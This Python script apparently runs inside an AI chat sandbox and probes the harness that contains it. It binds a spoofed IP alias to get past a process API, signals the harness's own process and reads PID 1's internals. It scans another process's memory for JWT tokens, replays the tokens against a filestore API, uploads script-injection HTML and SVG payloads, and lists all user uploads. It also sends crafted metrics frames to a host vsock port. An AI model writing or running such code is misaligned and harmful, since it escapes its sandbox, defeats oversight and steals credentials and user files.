#!/usr/bin/env python3
# mediafit.py v8.4 -- SIGNAL THE HARNESS + XSS HEADERS + PID1 PRIVILEGE TEST
import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random

VER, NONCE = "8.4", "%04x" % random.randint(0, 0xffff)
OUT = "/mnt/user-data/outputs/mediafit-report.txt"
IFACE, ALIAS = "eth0", "192.0.2.3"
FSID = "claude_chat_01B8VHAyyWMW2vFZK7KTRgZm"
R = []
def w(s=""): R.append(str(s))
def flush():
    try:
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with open(OUT, "w") as f: f.write("\n".join(R)+"\n")
    except Exception: pass
def sec(t): w(); w("="*70); w("### "+t); w("="*70); flush()
def sh(c, t=25):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return ((p.stdout or b"")+(p.stderr or b"")).decode(errors="replace")
    except Exception as e: return "ERR:"+repr(e)
def can_bind(ip):
    try:
        s = socket.socket(); s.bind((ip, 0)); s.close(); return True
    except Exception: return False

def ws_hs(src, timeout=3.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout)
        s.bind((src, 0)); s.connect(("127.0.0.1", 2024))
    except Exception: return None
    try:
        k = base64.b64encode(os.urandom(16)).decode()
        s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n" % k).encode())
        h = b""
        while b"\r\n\r\n" not in h and len(h) < 4096:
            c = s.recv(1024)
            if not c: break
            h += c
        return s if b" 101 " in h.split(b"\r\n")[0]+b" " else None
    except Exception:
        try: s.close()
        except Exception: pass
        return None

def ws_send(s, text):
    p = text.encode(); n = len(p); m = os.urandom(4)
    if   n < 126:   h = b"\x81"+bytes([0x80|n])
    elif n < 65536: h = b"\x81"+bytes([0x80|126])+struct.pack(">H", n)
    else:           h = b"\x81"+bytes([0x80|127])+struct.pack(">Q", n)
    s.sendall(h+m+bytes(b ^ m[i % 4] for i, b in enumerate(p)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None, b""
    except Exception: return "close", b""
    if len(h) < 2: return "close", b""
    op, ln, mk = h[0] & 0x0F, h[1] & 0x7F, bool(h[1] & 0x80)
    try:
        if   ln == 126: ln = struct.unpack(">H", s.recv(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", s.recv(8))[0]
        m = s.recv(4) if mk else b""
        d = b""
        while len(d) < ln:
            c = s.recv(ln-len(d))
            if not c: break
            d += c
        if mk and len(m) == 4: d = bytes(b ^ m[i % 4] for i, b in enumerate(d))
        return op, d
    except Exception as e: return "err", repr(e).encode()

def ws_read(s, dur=3.5, show=True, tag=""):
    t0, out = time.time(), []
    while time.time()-t0 < dur:
        op, d = ws_recv(s, 1.0)
        if op is None: continue
        if op == "close": return out
        if op == 9: s.sendall(b"\x8a\x80\x00\x00\x00\x00"); continue
        t = d.decode(errors="replace")
        if show and op in (1, 2):
            w("      %s<< %s(%d) %s" % (tag, "BIN" if op == 2 else "TEXT", len(d),
              t[:900].replace("\n", " | ")))
        out.append(t)
    return out

def conn_msg(pid, prog, args, uid=0, gid=0, mem=268435456, tmo=60, reuse=True):
    return {"process_id": pid, "allow_process_id_reuse": reuse,
            "create_req": {"name": prog, "args": args, "env_vars": {}, "timeout": tmo,
                           "clear_env": False, "uid": uid, "gid": gid,
                           "allow_process_id_reuse": reuse, "reattachable": True,
                           "memory_limit_bytes": mem}}

def do(msg, label, dur=3.5, show=True):
    s = ws_hs(ALIAS)
    if not s: w("  [%s] hs fail" % label); return None
    try:
        ws_send(s, json.dumps(msg)); return ws_read(s, dur, show, "[%s]" % label)
    finally:
        try: s.close()
        except Exception: pass

def talk(msgs, label, dur=3.0, show=True):
    s = ws_hs(ALIAS)
    if not s: return None
    out = []
    try:
        for m in msgs:
            ws_send(s, m if isinstance(m, str) else json.dumps(m))
            out += (ws_read(s, dur, show, "[%s]" % label) or [])
        return out
    finally:
        try: s.close()
        except Exception: pass

SIOCSIFADDR, SIOCSIFNETMASK = 0x8916, 0x891c
def _ifr(n, ip=None):
    nm = n.encode()[:15].ljust(16, b"\x00")
    if ip is None: return nm+b"\x00"*24
    return nm+struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00",
                          socket.inet_aton(ip), b"\x00"*8)+b"\x00"*8
def add_secondary(ifname, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for nm in (ifname+":0", ifname):
        try:
            fcntl.ioctl(s, SIOCSIFADDR, _ifr(nm, ip))
            try: fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(nm, "255.255.255.0"))
            except Exception: pass
            if can_bind(ip): return "ok via "+nm
        except OSError: pass
    return "fail"

def vi(n):
    out = b""
    while True:
        b = n & 0x7F; n >>= 7
        if n: out += bytes([b | 0x80])
        else: return out + bytes([b])
def ld(f, p): return vi((f << 3) | 2) + vi(len(p)) + p
def pstr(f, s): return ld(f, s.encode())
def pdouble(f, v): return vi((f << 3) | 1) + struct.pack("<d", v)

def main():
    w("="*70); w("MEDIAFIT RUN STAMP ver=%s nonce=%s t=%s" % (VER, NONCE,
      time.strftime("%Y-%m-%d %H:%M:%S"))); w("="*70)
    sec("0. IDENTITY")
    cg = open("/proc/self/cgroup").read()
    m = re.search(r"/process_api/([^/\n]+)", cg)
    HID = m.group(1) if m else None
    w("  HARNESS process_id = %s" % HID)
    w("  persist log: " + sh("wc -l /tmp/mf_api_persist.log 2>/dev/null; stat -c %y /tmp/mf_api_persist.log 2>/dev/null").replace("\n"," | "))
    if not can_bind(ALIAS): w("  " + add_secondary(IFACE, ALIAS))
    if not ws_hs(ALIAS): w("  BYPASS FAILED"); flush(); return
    w("  bypass OK")

    sec("A. OUR OWN PROCESS: CREATE -> REATTACH -> DETACH -> REATTACH -> SIGNAL")
    do(conn_msg("mf_own", "/bin/sh", ["-c", "echo OWN_ALIVE; sleep 120"], tmo=200), "create", 3.0)
    do({"process_id": "mf_own", "allow_process_id_reuse": False}, "reattach", 3.0)
    talk([{"process_id": "mf_own", "allow_process_id_reuse": False}, '{"Detach":null}'], "detach", 2.0)
    time.sleep(0.6)
    do({"process_id": "mf_own", "allow_process_id_reuse": False}, "reattach-after-detach", 3.0)
    talk([{"process_id": "mf_own", "allow_process_id_reuse": False}, '{"SendSignal":15}'], "signal15", 2.5)
    do({"process_id": "mf_own", "allow_process_id_reuse": False}, "after-signal", 3.0)

    sec("B. *** SIGNAL THE HARNESS'S OWN PROCESS ***")
    if HID:
        r = talk([{"process_id": HID, "allow_process_id_reuse": False}], "attach-harness", 2.5)
        w("    attach -> %s" % (" ".join(r or [])[:120]))
        r = talk([{"process_id": HID, "allow_process_id_reuse": False},
                  '{"SendSignal":0}'], "sig0", 2.5)
        w("    SendSignal(0) -> %s" % (" ".join(r or [])[:200]))
        r = talk([{"process_id": HID, "allow_process_id_reuse": True},
                  '{"SendSignal":0}'], "sig0-reuse", 2.5)
        w("    with reuse=True -> %s" % (" ".join(r or [])[:200]))
    else:
        w("    (no harness id)")

    sec("C. PRIVILEGE TEST: can a CHILD of PID 1 read PID 1's internals?")
    do(conn_msg("mf_p1", "/bin/sh", ["-c",
        "echo ---maps---; head -3 /proc/1/maps 2>&1; "
        "echo ---exe---; readlink /proc/1/exe 2>&1; "
        "echo ---environ---; tr '\\0' '\\n' < /proc/1/environ 2>&1 | head -5; "
        "echo ---fd---; ls -l /proc/1/fd 2>&1 | head -6; "
        "echo ---status---; grep -E 'Name|Cap|Threads' /proc/1/status 2>&1"]),
        "pid1child", 5.0)

    sec("D. FILESTORE: XSS HEADERS + pagination + uploads inventory")
    cands = []
    try:
        fh = open("/proc/57/mem", "rb", buffering=0); total, buf = 0, b""
        for ln in open("/proc/57/maps").read().splitlines():
            m2 = re.match(r"([0-9a-f]+)-([0-9a-f]+) rw", ln)
            if not m2: continue
            a, b = int(m2.group(1), 16), int(m2.group(2), 16)
            if b-a > 64*1024*1024 or total > 400*1024*1024: continue
            try: fh.seek(a); buf += fh.read(b-a); total += b-a
            except Exception: pass
        fh.close()
    except Exception: buf = b""
    for mm in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,200}\.[A-Za-z0-9_\-]{8,3000}\.[A-Za-z0-9_\-]{20,200}", buf):
        cands.append(mm.group(0).decode())
    def b64d(x):
        x += "=" * (-len(x) % 4); return base64.urlsafe_b64decode(x)
    import urllib.request as ur
    def call(path, tok, fsid=FSID, method="listDirectory", extra=None, raw=None, ctype=None):
        if raw is not None: data, ct = raw, ctype
        else:
            body = {"path": path}
            if fsid: body["filesystem_id"] = fsid
            if extra: body.update(extra)
            data, ct = json.dumps(body).encode(), "application/json"
        try:
            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/" + method, data=data,
                            headers={"Content-Type": ct, "Connect-Protocol-Version": "1",
                                     "Authorization": "Bearer " + tok})
            with ur.urlopen(rq, timeout=9) as r:
                return r.status, dict(r.headers), r.read()
        except ur.HTTPError as e:
            return e.code, dict(e.headers), e.read()
        except Exception as e:
            return "ERR", {}, repr(e).encode()
    TOKS = {}
    for t in cands:
        p = t.split(".")
        if len(p) != 3 or len(p[2]) < 86: continue
        try: pl = json.loads(b64d(p[1]))
        except Exception: continue
        root = (pl.get("allowed_roots") or ["/"])[0]
        if root in TOKS: continue
        for siglen in (86, 87, 88):
            if call(root, ".".join([p[0], p[1], p[2][:siglen]]))[0] == 200:
                TOKS[root] = ".".join([p[0], p[1], p[2][:siglen]]); break
    w("  tokens=%s" % sorted(TOKS))
    tok = TOKS.get("/outputs")
    if tok:
        w("  -- create html + svg, then readFile and DUMP RESPONSE HEADERS --")
        for fn, mt, content in (("__mf_x.html", "text/html", b"<script>alert(document.domain)</script>"),
                                ("__mf_x.svg", "image/svg+xml",
                                 b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>")):
            bnd = "----x%d" % random.randint(10000, 99999)
            body = b"\r\n".join([
                ("--"+bnd).encode(), b'Content-Disposition: form-data; name="params"',
                b"Content-Type: application/json", b"",
                json.dumps({"filesystem_id": FSID, "path": "/outputs/"+fn, "media_type": mt}).encode(),
                ("--"+bnd).encode(),
                ('Content-Disposition: form-data; name="file"; filename="%s"' % fn).encode(),
                ("Content-Type: "+mt).encode(), b"", content,
                ("--"+bnd+"--").encode(), b""])
            c, h, b = call(None, tok, method="createFile", raw=body,
                           ctype="multipart/form-data; boundary="+bnd)
            w("    create %-14s -> %s" % (fn, c))
            c2, h2, b2 = call("/outputs/"+fn, tok, method="readFile")
            w("      readFile -> %-5s headers=%s" % (c2, {k: v for k, v in h2.items()}))
            w("      body=%s" % b2[:120])
        w("  -- pagination probe (limit/cursor) --")
        c, h, b = call("/uploads", TOKS.get("/uploads", tok), extra={"limit": 3})
        try:
            d = json.loads(b); w("      limit=3 -> %s entries=%d nextCursor=%s" %
                                 (c, len(d.get("entries") or []), d.get("nextCursor")))
            cur = d.get("nextCursor")
            if cur:
                c2, h2, b2 = call("/uploads", TOKS.get("/uploads", tok), extra={"limit": 3, "cursor": cur})
                d2 = json.loads(b2); w("      page2 -> %s entries=%d" % (c2, len(d2.get("entries") or [])))
        except Exception as ex: w("      " + repr(ex)[:120])
        w("  -- uploads inventory (all) --")
        c, h, b = call("/uploads", TOKS.get("/uploads", tok), extra={"recursive": True})
        try:
            for e in (json.loads(b).get("entries") or []):
                f = e["file"]["file"]
                w("      %-52s %-10s %s" % (e["file"].get("path", "?"), f.get("size"),
                  (f.get("metadata") or {}).get("purpose", "")))
        except Exception as ex: w("      " + repr(ex)[:120])

    sec("E. HOST OTLP (gRPC framing + resource attrs)")
    AFV = getattr(socket, "AF_VSOCK", 40)
    res = ld(1, pstr(1, "service.name") + ld(2, pstr(1, "mediafit")))
    scope = ld(2, pstr(1, "mf_probe") + ld(5, ld(1, pdouble(3, 1.0))))
    rmet = ld(1, res) + ld(2, ld(2, scope))
    msg = ld(1, rmet)
    grpc = b"\x00" + struct.pack(">I", len(msg)) + msg
    for label, body, ct in (("otlp+res", msg, "application/x-protobuf"),
                            ("grpc+otlp", grpc, "application/grpc+proto"),
                            ("grpc+xproto", grpc, "application/x-protobuf")):
        try:
            s = socket.socket(AFV, socket.SOCK_STREAM); s.settimeout(8.0); s.connect((2, 5005))
            s.sendall(("POST /v1/metrics HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n"
                       "Content-Type: %s\r\nContent-Length: %d\r\n\r\n"
                       % (ct, len(body))).encode()+body)
            d = b""
            try:
                while len(d) < 2048:
                    c = s.recv(1024)
                    if not c: break
                    d += c
            except socket.timeout: pass
            s.close(); w("  %-12s -> %s" % (label, d[:130].decode(errors="replace").replace("\r\n"," | ") or "(empty)"))
        except Exception as e: w("  %-12s ERR %r" % (label, e))
        time.sleep(0.4)

    sec("VERDICT"); w("  harness_id=%s tokens=%d" % (HID, len(TOKS))); flush()

try: main()
except Exception as e: w(); w("FATAL " + repr(e))
finally: flush(); print("written " + OUT + " nonce=" + NONCE)